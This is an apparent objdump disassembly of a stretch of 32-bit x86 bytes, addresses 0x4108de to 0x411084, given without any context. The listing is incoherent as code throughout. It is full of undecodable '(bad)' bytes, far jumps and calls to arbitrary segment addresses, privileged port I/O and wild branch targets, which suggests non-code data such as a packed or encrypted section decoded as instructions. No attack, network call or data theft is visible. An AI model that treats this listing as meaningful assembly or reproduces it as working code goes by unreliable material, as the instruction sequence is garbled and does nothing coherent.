  4108de:	js     0x41093c
  4108e0:	pushf  
  4108e1:	(bad)  
  4108e2:	xchg   ecx,eax
  4108e3:	mov    ebp,0xcd793720
  4108e8:	clc    
  4108e9:	sahf   
  4108ea:	push   ebx
  4108eb:	push   0x16ef9982
  4108f0:	fstp   st(0)
  4108f2:	fst    QWORD PTR [ecx-0x64]
  4108f5:	sbb    eax,0xb3475998
  4108fa:	pop    eax
  4108fb:	add    ecx,ebx
  4108fd:	mov    ch,BYTE PTR fs:[ebp-0x3adb683d]
  410904:	(bad)  
  410905:	jae    0x4108c1
  410907:	add    eax,ebx
  410909:	xor    DWORD PTR [esi+0x30dca04e],esp
  41090f:	ds jle 0x410958
  410912:	xor    al,0x4b
  410914:	mov    BYTE PTR [esp+edx*8+0x64],dl
  410918:	(bad)  
  410919:	adc    esi,DWORD PTR [esi-0x109699d5]
  41091f:	lock imul esi,DWORD PTR [esi],0x8e733f6e
  410926:	repz jae 0x4108fc
  410929:	and    BYTE PTR [eax+ebp*2+0x48],al
  41092d:	pop    ss
  41092e:	inc    ecx
  41092f:	popf   
  410930:	(bad)  
  410932:	test   BYTE PTR [ebx],bh
  410934:	(bad)  
  410935:	lahf   
  410936:	pop    ebx
  410937:	adc    eax,edi
  410939:	sub    DWORD PTR [ecx],esp
  41093b:	mov    ebx,0xb2a8e985
  410940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410941:	or     bh,BYTE PTR [esi]
  410943:	push   esp
  410944:	cmp    eax,DWORD PTR [ecx]
  410946:	leave  
  410947:	or     BYTE PTR [eax],dh
  410949:	add    al,BYTE PTR [edx]
  41094b:	push   ebp
  41094c:	mov    WORD PTR [eax-0x7cfbc7cf],ds
  410952:	lds    ebx,FWORD PTR [edi-0xc03da04]
  410958:	mov    ah,BYTE PTR [edi-0x5a]
  41095b:	jmp    0xcc2d:0x9ac6bb93
  410962:	jnp    0x41099f
  410964:	add    BYTE PTR [eax],al
  410966:	xchg   ebp,eax
  410967:	sbb    BYTE PTR [eax-0x7988d70c],al
  41096d:	sub    BYTE PTR [ebx+ebx*2-0x59c2c41b],0xbe
  410975:	cld    
  410976:	mov    ecx,0x1b50a1ae
  41097b:	inc    edx
  41097c:	xchg   edx,ebx
  41097e:	neg    DWORD PTR [edi+ebx*2-0x17bc8688]
  410985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410986:	aam    0xe6
  410988:	stos   BYTE PTR es:[edi],al
  410989:	sbb    ecx,ecx
  41098b:	push   edx
  41098c:	mov    cl,0x1a
  41098e:	and    eax,0x641d241c
  410993:	and    ebx,edi
  410995:	imul   BYTE PTR [ebx+eiz*2+0x71]
  410999:	or     al,ah
  41099b:	push   0x94f34a96
  4109a0:	pushf  
  4109a1:	sbb    BYTE PTR [edx+ecx*1+0x11f25675],ch
  4109a8:	mov    cl,0xc6
  4109aa:	repnz push eax
  4109ac:	sub    BYTE PTR [eax-0x29e7f9d1],bl
  4109b2:	inc    ecx
  4109b3:	jmp    0x9038:0xfbaf8268
  4109ba:	leave  
  4109bb:	and    DWORD PTR [ebx],ebx
  4109bd:	add    esi,DWORD PTR [ebp+eiz*8+0x30]
  4109c1:	lods   al,BYTE PTR ds:[esi]
  4109c2:	jecxz  0x410a15
  4109c4:	inc    edi
  4109c5:	push   0x9316024d
  4109ca:	fidivr WORD PTR [esi]
  4109cc:	push   ebx
  4109cd:	mov    ebx,DWORD PTR [ecx]
  4109cf:	dec    esp
  4109d0:	mov    dl,0xad
  4109d2:	mov    esp,edi
  4109d4:	cdq    
  4109d5:	pop    es
  4109d6:	pop    ebp
  4109d7:	in     eax,0x88
  4109d9:	push   esp
  4109da:	and    al,BYTE PTR [eax+0x6a]
  4109dd:	jle    0x4109a4
  4109df:	xchg   esp,eax
  4109e0:	cmp    eax,0x8939b5c9
  4109e5:	rcr    DWORD PTR [edx-0x6d],1
  4109e8:	pop    esi
  4109e9:	adc    DWORD PTR [edx],0x380a4402
  4109ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109f0:	(bad)  
  4109f1:	mov    esp,0xbbf29
  4109f6:	addr16 jne 0x410a20
  4109f9:	push   esi
  4109fa:	test   al,0x3b
  4109fc:	imul   edx,ebp,0xfffffff2
  4109ff:	clc    
  410a00:	js     0x4109ba
  410a02:	push   ecx
  410a03:	cmp    eax,0x7cae4352
  410a08:	cmp    DWORD PTR [ebp+0x72c58128],esi
  410a0e:	leave  
  410a0f:	popf   
  410a10:	data16 cld 
  410a12:	jbe    0x4109ff
  410a14:	call   0x14992b12
  410a19:	call   0xc1a9:0x6d907f30
  410a20:	(bad)  
  410a21:	sub    bl,ch
  410a23:	jl     0x410a0b
  410a25:	(bad)  
  410a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a27:	cmp    dl,BYTE PTR [eax-0x7f]
  410a2a:	xor    BYTE PTR [esi+edx*1+0x71],ah
  410a2e:	push   es
  410a2f:	jno    0x4109fd
  410a31:	add    DWORD PTR [ebx+eax*2-0x2],edi
  410a35:	and    bl,bh
  410a37:	scas   eax,DWORD PTR es:[edi]
  410a38:	vpsubb ymm1,ymm7,ymm5
  410a3c:	or     dh,BYTE PTR [edx]
  410a3e:	mov    ah,0xd0
  410a40:	daa    
  410a41:	in     eax,dx
  410a42:	jns    0x410a0d
  410a44:	sub    dl,BYTE PTR ds:0x8fb5239e
  410a4a:	ror    BYTE PTR [edi-0x4a],1
  410a4d:	sub    DWORD PTR [ebp+0x7ed295c2],edi
  410a53:	mov    dl,0xd2
  410a55:	jmp    0x410a9d
  410a57:	cmp    al,0x27
  410a59:	dec    ebp
  410a5a:	or     ecx,esp
  410a5c:	mov    ecx,0x495b4aa7
  410a61:	shr    BYTE PTR [edx+0x723a5a32],1
  410a67:	or     DWORD PTR [esi-0x6028e54],ecx
  410a6d:	push   edi
  410a6e:	pop    ecx
  410a6f:	adc    eax,0x3371cf82
  410a74:	mov    di,0xeb32
  410a78:	int3   
  410a79:	bound  esp,QWORD PTR [eax+edi*2-0x59]
  410a7d:	add    al,0xe8
  410a7f:	dec    edi
  410a80:	mov    bh,bh
  410a82:	add    ch,al
  410a84:	sub    ch,al
  410a86:	mov    ebx,0x6cf606c5
  410a8b:	lea    eax,[ebx]
  410a8d:	stos   BYTE PTR es:[edi],al
  410a8e:	inc    edi
  410a8f:	fist   WORD PTR [eax+edx*4+0x7b49b346]
  410a96:	sbb    al,0xf1
  410a98:	push   ds
  410a99:	push   esi
  410a9a:	pop    ebx
  410a9b:	call   0xa103:0x35b661d6
  410aa2:	adc    bl,BYTE PTR [ebp-0x52]
  410aa5:	add    al,0x61
  410aa7:	(bad)
  410aaa:	push   es
  410aab:	repnz nop
  410aad:	stos   BYTE PTR es:[edi],al
  410aae:	jp     0x410b28
  410ab0:	dec    edx
  410ab1:	sub    eax,0x31fef99a
  410ab6:	sbb    ch,cl
  410ab8:	fistp  QWORD PTR [ecx-0x1292ba9e]
  410abe:	in     al,0x6d
  410ac0:	inc    ecx
  410ac1:	in     eax,0x10
  410ac3:	mov    ds:0x7b0183f0,al
  410ac8:	adc    DWORD PTR [edi+0x2589c6de],0xb224567c
  410ad2:	ja     0x410b32
  410ad4:	sbb    BYTE PTR [ebp-0x3f668103],bl
  410ada:	outs   dx,DWORD PTR ds:[esi]
  410adb:	adc    eax,0x26339a6c
  410ae0:	mov    ah,0x55
  410ae2:	js     0x410aac
  410ae4:	cwde   
  410ae5:	popf   
  410ae6:	cld    
  410ae7:	retf   0x5780
  410aea:	cmp    DWORD PTR [esi],0xffffff85
  410aed:	mov    dl,0x62
  410aef:	cmp    ah,BYTE PTR [ebx-0x3d]
  410af2:	rcl    DWORD PTR [esi],1
  410af4:	jns    0x410aa6
  410af6:	xor    cl,0x61
  410af9:	call   FWORD PTR [eax+0x69]
  410afc:	adc    edi,DWORD PTR [ecx]
  410afe:	mov    edx,0xe5e0ac3
  410b03:	cmp    BYTE PTR [eax+0x2c],dl
  410b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b07:	js     0x410ac3
  410b09:	icebp  
  410b0a:	jnp    0x410b04
  410b0c:	push   esp
  410b0d:	mov    esp,0x2bd56f83
  410b12:	xor    al,0x13
  410b14:	cli    
  410b15:	loop   0x410aa2
  410b17:	das    
  410b18:	pusha  
  410b19:	xor    eax,0xe0dd631
  410b1e:	inc    esp
  410b1f:	xchg   esi,eax
  410b20:	add    BYTE PTR [ebx],dh
  410b22:	pop    esp
  410b23:	fnstsw WORD PTR [ebp+0x17]
  410b26:	iret   
  410b27:	outs   dx,DWORD PTR ds:[esi]
  410b28:	mov    bl,0xd4
  410b2a:	xchg   DWORD PTR [esp+esi*1-0x28],edx
  410b2e:	pop    ebx
  410b2f:	inc    edi
  410b30:	mov    ecx,0xbb90e9d3
  410b35:	sub    eax,0x71656f49
  410b3a:	stc    
  410b3b:	in     al,dx
  410b3c:	fucom  st(7)
  410b3e:	ss jae 0x410b77
  410b41:	sbb    ebx,DWORD PTR [esi-0x25]
  410b44:	adc    eax,0xb32ce718
  410b49:	test   DWORD PTR [ecx+0x5d],edx
  410b4c:	xchg   esp,eax
  410b4d:	daa    
  410b4e:	ficom  DWORD PTR [edi+0x1c]
  410b51:	xchg   ebp,eax
  410b52:	cmp    eax,DWORD PTR [edx]
  410b54:	add    al,0x31
  410b56:	imul   ebp,ebx,0x15
  410b59:	sbb    BYTE PTR [ecx],ah
  410b5b:	jmp    0x353:0x84d70e5d
  410b62:	scas   eax,DWORD PTR es:[edi]
  410b63:	xchg   ebx,eax
  410b64:	fsubp  st(0),st
  410b66:	daa    
  410b67:	lahf   
  410b68:	and    BYTE PTR [ecx+ebx*8],bl
  410b6b:	test   DWORD PTR [edx+0x39564a88],esp
  410b71:	rcr    DWORD PTR [eax+0x5f],1
  410b74:	mov    cl,0xba
  410b76:	iret   
  410b77:	push   ss
  410b78:	outs   dx,DWORD PTR ds:[esi]
  410b79:	cmp    eax,0x6033795
  410b7e:	sub    bl,BYTE PTR ds:0x6195b609
  410b84:	inc    esi
  410b85:	inc    esi
  410b86:	mov    cl,0xc7
  410b88:	jecxz  0x410b6b
  410b8a:	and    al,0x5c
  410b8c:	and    ch,BYTE PTR [ebx-0x2105e961]
  410b92:	xor    edx,ecx
  410b94:	sar    DWORD PTR [ebx+0x435dfe93],0xe7
  410b9b:	push   0x34
  410b9d:	out    dx,al
  410b9e:	sub    al,0x33
  410ba0:	jg     0x410b3b
  410ba2:	jp     0x410c17
  410ba4:	xchg   ebp,ebx
  410ba6:	mov    dh,0x7a
  410ba8:	aaa    
  410ba9:	mov    eax,0xeb1f572c
  410bae:	(bad)  
  410baf:	pop    es
  410bb0:	(bad)  
  410bb1:	push   edi
  410bb2:	dec    ebx
  410bb3:	ja     0x410b93
  410bb5:	sub    BYTE PTR ds:0x4ffba3d,dh
  410bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bbc:	jbe    0x410c1a
  410bbe:	pop    es
  410bbf:	pop    ds
  410bc0:	jmp    0x139:0x544be4be
  410bc7:	ficomp DWORD PTR [ecx+0x59]
  410bca:	mov    eax,0x7a6e9220
  410bcf:	mov    al,0x57
  410bd1:	adc    al,0x82
  410bd3:	test   BYTE PTR [eax+edx*8-0x1a83b890],dh
  410bda:	inc    esp
  410bdb:	push   ecx
  410bdc:	jge    0x410c51
  410bde:	and    ecx,DWORD PTR ds:0xbbf8aadb
  410be4:	repnz xchg si,ax
  410be7:	xchg   edi,eax
  410be8:	inc    edi
  410be9:	cmp    bh,BYTE PTR [ecx+0x4e]
  410bec:	inc    eax
  410bed:	stos   DWORD PTR es:[edi],eax
  410bee:	mov    eax,0x8f70bc63
  410bf3:	nop
  410bf4:	adc    bl,dh
  410bf6:	pop    eax
  410bf7:	adc    al,0x17
  410bf9:	or     ah,0xd3
  410bfc:	sbb    BYTE PTR [ecx+ebx*4+0x50],0xf5
  410c01:	and    edi,esp
  410c03:	outs   dx,BYTE PTR ds:[esi]
  410c04:	jns    0x410bed
  410c06:	data16 sbb BYTE PTR [ecx],cl
  410c09:	xchg   esp,eax
  410c0a:	ret    
  410c0b:	nop
  410c0c:	cmp    dh,ah
  410c0e:	mov    ah,0x4c
  410c10:	pop    es
  410c11:	mov    eax,ebp
  410c13:	sub    al,0x12
  410c15:	mov    ah,0x2d
  410c17:	in     al,dx
  410c18:	cmp    BYTE PTR [ebx+ebp*4],bh
  410c1b:	push   ss
  410c1c:	mov    al,0x82
  410c1e:	js     0x410bb9
  410c20:	int    0x7d
  410c22:	stos   DWORD PTR es:[edi],eax
  410c23:	pop    esi
  410c24:	or     ebx,DWORD PTR es:[edx]
  410c27:	fisttp DWORD PTR [ebx]
  410c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c2a:	dec    esp
  410c2b:	out    0xef,al
  410c2d:	in     al,dx
  410c2e:	fisttp WORD PTR [edi+0x2e]
  410c31:	adc    edx,DWORD PTR [esi]
  410c33:	jns    0x410c93
  410c35:	inc    ebp
  410c36:	imul   ebx,DWORD PTR [ecx],0x807711a7
  410c3c:	sbb    eax,0x2ab2a3de
  410c41:	push   es
  410c42:	aad    0xa8
  410c44:	push   edx
  410c45:	out    dx,al
  410c46:	neg    BYTE PTR [edx-0x7e]
  410c49:	jmp    0x616338e
  410c4e:	sub    ebp,esi
  410c50:	outs   dx,DWORD PTR ds:[esi]
  410c51:	dec    ecx
  410c52:	jle    0x410c0d
  410c54:	jnp    0x410c97
  410c56:	mov    eax,fs
  410c58:	dec    esp
  410c59:	mov    cl,0x6f
  410c5b:	call   0x4aff:0x5585b5d9
  410c62:	push   ss
  410c63:	or     BYTE PTR [ecx-0x4a4bf074],0xec
  410c6a:	sub    al,0x6e
  410c6c:	in     eax,dx
  410c6d:	xor    ch,dl
  410c6f:	adc    DWORD PTR [eax-0x23],0xffffff9b
  410c73:	sti    
  410c74:	cmp    bh,BYTE PTR [ecx]
  410c76:	jns    0x410c0c
  410c78:	test   al,0x73
  410c7a:	sub    BYTE PTR [ebx+eiz*1],dl
  410c7d:	jg     0x410c96
  410c7f:	bound  ebp,QWORD PTR [edi+eax*1]
  410c82:	adc    eax,0xf4a1a3c5
  410c87:	loope  0x410c64
  410c89:	mov    ch,0x7e
  410c8b:	pop    esi
  410c8c:	frstor [esi-0x232d5e28]
  410c92:	pop    ds
  410c93:	cmp    ebp,ebp
  410c95:	mov    edi,0x60afb956
  410c9a:	mov    WORD PTR [eax+0x221fb07a],?
  410ca0:	test   al,0xa7
  410ca2:	aas    
  410ca3:	or     ch,bl
  410ca5:	inc    edx
  410ca6:	cmp    ecx,DWORD PTR [edx-0x52]
  410ca9:	jge    0x410c59
  410cab:	xchg   esp,eax
  410cac:	xor    dh,al
  410cae:	das    
  410caf:	out    dx,al
  410cb0:	nop
  410cb1:	jae    0x410cca
  410cb3:	repnz xchg ecx,eax
  410cb5:	pop    ebp
  410cb6:	cmp    al,0x5e
  410cb8:	or     DWORD PTR [ebx+0x2],ebx
  410cbb:	(bad)  
  410cbc:	sub    DWORD PTR [ebx+0x54],ebp
  410cbf:	xor    bl,dl
  410cc1:	mov    ch,0xe0
  410cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cc4:	(bad)  
  410cc5:	lods   al,BYTE PTR ds:[esi]
  410cc6:	test   al,0x4
  410cc8:	push   ecx
  410cc9:	scas   al,BYTE PTR es:[edi]
  410cca:	jmp    0x97f5f3d1
  410ccf:	hlt    
  410cd0:	arpl   WORD PTR [ecx+0x2cfed771],si
  410cd6:	fwait
  410cd7:	adc    ecx,esp
  410cd9:	push   ecx
  410cda:	mov    esp,0xce2b930
  410cdf:	repnz pop ds
  410ce1:	mov    ch,0xa1
  410ce3:	mov    cl,0xf
  410ce5:	in     eax,0xb6
  410ce7:	jne    0x410c79
  410ce9:	in     al,0x2f
  410ceb:	aaa    
  410cec:	jo     0x410cc1
  410cee:	retf   
  410cef:	push   0xffffff99
  410cf1:	enter  0x8509,0xc1
  410cf5:	(bad)  
  410cf6:	std    
  410cf7:	repnz cmp eax,0xa27a984a
  410cfd:	rcr    DWORD PTR [ecx-0x25],cl
  410d00:	lods   al,BYTE PTR ds:[esi]
  410d01:	mov    edx,0xee94431c
  410d06:	add    eax,0xcf0dc536
  410d0b:	ss pop ss
  410d0d:	jmp    0x410cbe
  410d0f:	mul    BYTE PTR ds:0x5a3ea69a
  410d15:	std    
  410d16:	inc    ebx
  410d17:	pop    esi
  410d18:	gs pop es
  410d1a:	sub    al,0x67
  410d1c:	ja     0x410d5a
  410d1e:	sbb    al,0xeb
  410d20:	mov    al,0x14
  410d22:	fdiv   DWORD PTR [edx]
  410d24:	(bad)  
  410d25:	rol    DWORD PTR [esi-0x7826385a],1
  410d2b:	pop    ecx
  410d2c:	xor    DWORD PTR [esi+0x58],0x11d996f2
  410d33:	mov    ebx,DWORD PTR [edi+0x56]
  410d36:	sub    ch,BYTE PTR [eax+0x2b2362ba]
  410d3c:	cmp    ch,al
  410d3e:	mov    ebx,0x1e6546a5
  410d43:	cmp    al,0x68
  410d45:	mov    ebx,0xee7affbf
  410d4a:	fist   WORD PTR [eax-0x66]
  410d4d:	xchg   edi,eax
  410d4e:	fs xor al,0x87
  410d51:	imul   ebp,DWORD PTR [ecx+0x296c5848],0xffffff94
  410d58:	lea    edi,[edi+0x0]
  410d5b:	xchg   ebx,eax
  410d5c:	and    DWORD PTR [ebx+0x55],esp
  410d5f:	int3   
  410d60:	push   edi
  410d61:	enter  0x2a85,0x3f
  410d65:	inc    edi
  410d66:	cmp    eax,0xa333e6c8
  410d6b:	pop    ds
  410d6c:	out    dx,al
  410d6d:	adc    BYTE PTR cs:[edi+0x38a24924],bh
  410d74:	shr    ch,1
  410d76:	adc    BYTE PTR [ecx+edx*4-0x1502aa35],ah
  410d7d:	out    0x4c,al
  410d7f:	(bad)  
  410d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d81:	bound  esi,QWORD PTR [ecx*4+0x3464bc33]
  410d88:	mov    al,0xd9
  410d8a:	rcl    BYTE PTR [esi-0x1723e172],cl
  410d90:	inc    esp
  410d91:	xchg   esp,eax
  410d92:	adc    al,0x72
  410d94:	sub    eax,0x3166fb5a
  410d99:	add    bh,BYTE PTR [edi]
  410d9b:	nop
  410d9c:	retf   0x9e48
  410d9f:	dec    ecx
  410da0:	out    dx,al
  410da1:	nop
  410da2:	xchg   esp,eax
  410da3:	push   esi
  410da4:	mov    esi,DWORD PTR [esi]
  410da6:	idiv   DWORD PTR ds:0x667739ff
  410dac:	jmp    0x410df5
  410dae:	or     esi,ebp
  410db0:	mov    ds:0xe7e6ccb8,al
  410db5:	mov    ds:0xd9323594,al
  410dba:	sub    BYTE PTR ds:0x42e30c4e,dl
  410dc0:	jbe    0x410e01
  410dc2:	adc    ebx,edi
  410dc4:	pop    ebx
  410dc5:	out    0x2d,al
  410dc7:	repnz xchg esi,eax
  410dc9:	mov    bh,0x34
  410dcb:	add    al,0xd4
  410dcd:	out    0xc9,eax
  410dcf:	scas   al,BYTE PTR es:[edi]
  410dd0:	add    DWORD PTR [edi],esi
  410dd2:	sub    ah,BYTE PTR [ebx]
  410dd4:	loope  0x410e21
  410dd6:	pop    ds
  410dd7:	mov    ch,BYTE PTR [ebp-0x492293bd]
  410ddd:	xor    DWORD PTR [esi],eax
  410ddf:	mov    al,0xef
  410de1:	add    eax,0xf925ab2d
  410de6:	sar    DWORD PTR [ebp+0x17],1
  410de9:	in     al,0x9c
  410deb:	test   al,0x5b
  410ded:	popa   
  410dee:	dec    eax
  410def:	sahf   
  410df0:	mov    ch,0xa8
  410df2:	or     BYTE PTR [ecx],cl
  410df4:	mov    ecx,0x50487a7
  410df9:	mov    bl,0x84
  410dfb:	push   ss
  410dfc:	mov    ds:0x701f9c1b,eax
  410e01:	ret    0x1f70
  410e04:	inc    ebp
  410e05:	add    eax,ecx
  410e07:	out    0x54,al
  410e09:	xor    al,0x79
  410e0b:	push   0xffffffd2
  410e0d:	retf   0xfa90
  410e10:	lea    edx,[edx]
  410e12:	retf   
  410e13:	daa    
  410e14:	frstor [ebx-0x3a]
  410e17:	push   eax
  410e18:	cdq    
  410e19:	outs   dx,DWORD PTR ds:[esi]
  410e1a:	pop    ebx
  410e1b:	not    BYTE PTR [edx+0x1b]
  410e1e:	or     al,0x56
  410e20:	jp     0x410ddc
  410e22:	mov    edi,0x6900ea84
  410e27:	shl    BYTE PTR [edi],0xf5
  410e2a:	test   eax,0xa59a116d
  410e2f:	int    0x6
  410e31:	repnz push es
  410e33:	mov    cl,0xdc
  410e35:	cmp    DWORD PTR [ecx-0x52],ecx
  410e38:	mov    bl,BYTE PTR [eax+0x0]
  410e3b:	(bad)  
  410e3c:	shl    DWORD PTR [edx],1
  410e3e:	pop    edi
  410e3f:	sub    BYTE PTR [eax-0x200a12bf],ah
  410e45:	jl     0x410dfe
  410e47:	jmp    0x5ca548ea
  410e4c:	dec    eax
  410e4d:	retf   
  410e4e:	jp     0x410e8a
  410e50:	dec    esp
  410e51:	dec    ebx
  410e52:	shl    BYTE PTR [bp+di],cl
  410e55:	push   es
  410e56:	ins    BYTE PTR es:[edi],dx
  410e57:	lds    eax,FWORD PTR [ecx]
  410e59:	mov    dl,0x84
  410e5b:	and    edi,DWORD PTR [ecx-0x3f]
  410e5e:	outs   dx,BYTE PTR ds:[esi]
  410e5f:	adc    al,0x46
  410e61:	mov    bl,0x8b
  410e63:	aad    0x33
  410e65:	repz inc ebp
  410e67:	arpl   WORD PTR [ebx+0x3e99479b],bp
  410e6d:	imul   edi,DWORD PTR [esi],0x5e
  410e70:	call   0x6341ec2c
  410e75:	inc    ecx
  410e76:	adc    eax,DWORD PTR ds:0xba4ebca3
  410e7c:	nop
  410e7d:	(bad)
  410e81:	out    0x7c,al
  410e83:	cwde   
  410e84:	das    
  410e85:	fstp   TBYTE PTR [ebx+eax*2]
  410e88:	sbb    eax,0x2f441d62
  410e8d:	int3   
  410e8e:	push   es
  410e8f:	mov    WORD PTR [edx],cs
  410e91:	mov    dl,0x61
  410e93:	retf   0x520b
  410e96:	pop    ebx
  410e97:	mov    bh,0x9c
  410e99:	outs   dx,BYTE PTR ds:[esi]
  410e9a:	adc    BYTE PTR [eax],bl
  410e9c:	lods   eax,DWORD PTR ds:[esi]
  410e9d:	mov    ?,WORD PTR [esi+eiz*4-0x18]
  410ea1:	sbb    ah,bh
  410ea3:	shr    DWORD PTR [ecx],cl
  410ea5:	rol    BYTE PTR [ecx+0x61],0xcf
  410ea9:	outs   dx,DWORD PTR ds:[esi]
  410eaa:	inc    eax
  410eab:	fld    DWORD PTR [edi-0x3f2841d1]
  410eb1:	mov    ebx,0x1e8533db
  410eb6:	fidiv  DWORD PTR [esp+ecx*8-0x67]
  410eba:	jo     0x410e6f
  410ebc:	dec    ebp
  410ebd:	fs sbb eax,0xd2b683e0
  410ec3:	call   0xed41:0x9d960e7e
  410eca:	sub    al,0xf7
  410ecc:	sbb    al,0xa6
  410ece:	and    al,0xe2
  410ed0:	jbe    0x410e6e
  410ed2:	cmp    DWORD PTR [edi-0x75],esi
  410ed5:	pop    edi
  410ed6:	pop    edx
  410ed7:	inc    BYTE PTR [esi-0x69]
  410eda:	and    DWORD PTR [ebp+0x461c7494],esp
  410ee0:	aas    
  410ee1:	dec    ecx
  410ee2:	jle    0x410ed7
  410ee4:	popf   
  410ee5:	pop    eax
  410ee6:	add    cl,BYTE PTR [ecx]
  410ee8:	sbb    edi,DWORD PTR [edi]
  410eea:	add    eax,0x75e04b7a
  410eef:	pop    edx
  410ef0:	dec    ebx
  410ef1:	sbb    eax,edx
  410ef3:	sti    
  410ef4:	cmp    eax,0x45e41a38
  410ef9:	push   ebx
  410efa:	mov    edi,0x854dc6a7
  410eff:	in     eax,dx
  410f00:	call   0xd33d:0x6ff7b306
  410f07:	test   eax,0x766e9cb1
  410f0c:	mov    dl,al
  410f0e:	jbe    0x410f86
  410f10:	inc    BYTE PTR [esi-0x76]
  410f13:	in     eax,dx
  410f14:	sub    DWORD PTR [ebp+edi*1+0x50],ebp
  410f18:	popf   
  410f19:	pop    esp
  410f1a:	and    ch,BYTE PTR [edi-0x42]
  410f1d:	inc    eax
  410f1e:	inc    edi
  410f1f:	push   ebp
  410f20:	and    eax,0xd9f315c4
  410f25:	dec    esi
  410f26:	sbb    ch,bl
  410f28:	scas   al,BYTE PTR es:[edi]
  410f29:	outs   dx,DWORD PTR ds:[esi]
  410f2a:	loope  0x410ec1
  410f2c:	loope  0x410ec7
  410f2e:	repz jecxz 0x410f43
  410f31:	lods   al,BYTE PTR ds:[esi]
  410f32:	add    ecx,edx
  410f34:	xchg   DWORD PTR [ebx],ebp
  410f36:	shl    DWORD PTR [ebx],0xc8
  410f39:	je     0x410f05
  410f3b:	adc    BYTE PTR [eax+0x3a88b04d],ch
  410f41:	mov    BYTE PTR [edx-0x1c],dl
  410f44:	cmp    eax,0x926486bb
  410f49:	mov    ch,0x24
  410f4b:	dec    edx
  410f4c:	(bad)  
  410f4d:	mov    esi,0xb5a02a12
  410f52:	cmp    eax,0x592afb3a
  410f57:	and    al,0x23
  410f59:	fldcw  WORD PTR [ebx]
  410f5b:	ins    DWORD PTR es:[edi],dx
  410f5c:	lea    ebp,[esi+0x8417ea3]
  410f62:	inc    esp
  410f63:	mul    DWORD PTR [edx-0x2b2181db]
  410f69:	add    al,0xd0
  410f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6c:	sbb    al,0x6b
  410f6e:	push   ds
  410f6f:	jb     0x410eff
  410f71:	sbb    al,0x9d
  410f73:	(bad)  
  410f74:	adc    ch,BYTE PTR [eax+0x5fd76369]
  410f7a:	and    DWORD PTR ss:[eax-0x5847729],ebp
  410f81:	icebp  
  410f82:	xchg   ecx,eax
  410f83:	jg     0x410f49
  410f85:	and    al,0x5d
  410f87:	repnz jmp 0x31d2:0x49703ab8
  410f8f:	mov    dl,0xbd
  410f91:	push   ebp
  410f92:	adc    dl,BYTE PTR [ecx+eax*1]
  410f95:	fsubr  st(5),st
  410f97:	pop    esp
  410f98:	cmc    
  410f99:	jmp    0xf769e97f
  410f9e:	sbb    al,0xcf
  410fa0:	mov    ecx,ebx
  410fa2:	mov    ebx,0x575f9ef4
  410fa7:	add    BYTE PTR [eax-0x6d26a691],ah
  410fad:	adc    al,0xa6
  410faf:	sbb    eax,0xbac0affb
  410fb4:	cmp    ah,BYTE PTR [esi]
  410fb6:	imul   edi,edi,0xffffffcf
  410fb9:	leave  
  410fba:	or     DWORD PTR ds:0x68c8f849,0xffffffa1
  410fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc2:	push   ebp
  410fc3:	cmp    DWORD PTR [ebx],ebx
  410fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fc6:	xor    BYTE PTR [ebx+0x3f],0x4d
  410fca:	xor    bl,ah
  410fcc:	sbb    bl,BYTE PTR [esi-0x319071]
  410fd2:	mov    ch,0x71
  410fd4:	mov    ebx,0xf530ede2
  410fd9:	fadd   DWORD PTR [edx-0x39cddc3d]
  410fdf:	ja     0x410faa
  410fe1:	inc    edx
  410fe2:	mov    bl,0xe6
  410fe4:	add    BYTE PTR [edi+0x10392d67],ch
  410fea:	repz cli 
  410fec:	or     edi,DWORD PTR [esi]
  410fee:	pop    ebp
  410fef:	pop    ecx
  410ff0:	adc    esp,esp
  410ff2:	inc    ebp
  410ff3:	adc    BYTE PTR [ebp+0x66aef9bf],al
  410ff9:	inc    ebx
  410ffa:	hlt    
  410ffb:	push   ss
  410ffc:	outs   dx,BYTE PTR ds:[esi]
  410ffd:	in     al,0xe4
  410fff:	add    eax,0x92024bf8
  411004:	inc    edx
  411005:	in     eax,0xf1
  411007:	(bad)  
  411008:	out    0xbe,al
  41100a:	mov    ch,0xbc
  41100c:	test   ecx,ebx
  41100e:	mov    esi,DWORD PTR [ecx+edi*4+0xf]
  411012:	or     DWORD PTR [ebx-0x4e93de5f],eax
  411018:	cli    
  411019:	aas    
  41101a:	cmc    
  41101b:	fidivr DWORD PTR [ebx-0x5af9331]
  411021:	jbe    0x411031
  411023:	sbb    eax,0xdea01a59
  411028:	div    BYTE PTR [ecx+edx*2]
  41102b:	sub    al,0x69
  41102d:	pushf  
  41102e:	hlt    
  41102f:	push   ds
  411030:	retf   0x93f7
  411033:	daa    
  411034:	sub    BYTE PTR [ebp+0x2deda380],bh
  41103a:	fdiv   DWORD PTR [esi+ebp*2+0x2a]
  41103e:	xor    cl,ch
  411040:	daa    
  411041:	and    edi,ebx
  411043:	stos   DWORD PTR es:[edi],eax
  411044:	push   ss
  411045:	mov    bh,0x30
  411047:	sbb    al,0xaf
  411049:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41104b:	or     BYTE PTR [edx+ebp*4+0xc],cl
  41104f:	sbb    DWORD PTR [edx-0x12],ebp
  411052:	shl    BYTE PTR [edx],0x19
  411055:	xor    al,ah
  411057:	xor    esi,DWORD PTR [esi]
  411059:	jns    0x41109d
  41105b:	sub    al,0xec
  41105d:	mov    cl,0x3d
  41105f:	mov    ah,0xe9
  411061:	push   esi
  411062:	or     ebx,0xffffff86
  411065:	lock gs inc eax
  411068:	call   0x9cc2fd1d
  41106d:	xchg   edi,eax
  41106e:	aam    0xe4
  411070:	mov    esi,DWORD PTR [ebx+0x316b65fe]
  411076:	xor    BYTE PTR [ecx+0x39b82188],bl
  41107c:	mov    ch,0xf7
  41107e:	aas    
  41107f:	push   cs
  411080:	mov    bl,BYTE PTR [eax+0x3b]
  411083:	inc    edx
  411084:	test   bl,0xb4
